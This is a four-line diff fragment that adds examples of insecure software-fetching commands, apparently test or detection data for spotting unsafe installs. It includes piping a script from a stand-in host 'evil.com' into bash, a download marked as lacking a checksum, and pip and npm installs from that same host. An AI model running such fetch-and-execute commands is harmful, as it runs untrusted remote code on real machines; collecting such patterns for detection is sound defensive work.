@@ -1,0 +1,4 @@
+curl http://evil.com/script.sh | bash
+wget http://update.server/pkg.tar.gz (no checksum)
+pip install --index-url http://evil.com package
+npm install http://evil.com/package.tgz
